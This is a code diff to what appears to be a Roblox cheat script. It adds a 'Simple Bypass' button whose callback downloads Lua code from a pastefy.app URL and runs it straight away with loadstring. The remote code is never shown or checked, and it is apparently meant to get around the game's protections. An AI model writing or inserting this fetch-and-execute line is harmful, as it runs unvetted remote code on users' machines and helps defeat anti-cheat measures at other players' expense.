@@ -550,6 +550,13 @@ MainTab:AddToggle({
 	end    
 })
 
+MainTab:AddButton({
+	Name = "Simple Bypass",
+	Callback = function()
+	loadstring(game:HttpGet("https://pastefy.app/pwnIeRLX/raw"))()
+	end
+})
+
 local OtherTab = Window:MakeTab({
 	Name = "[📝] Other",
 	Icon = "rbxassetid://18186948969",
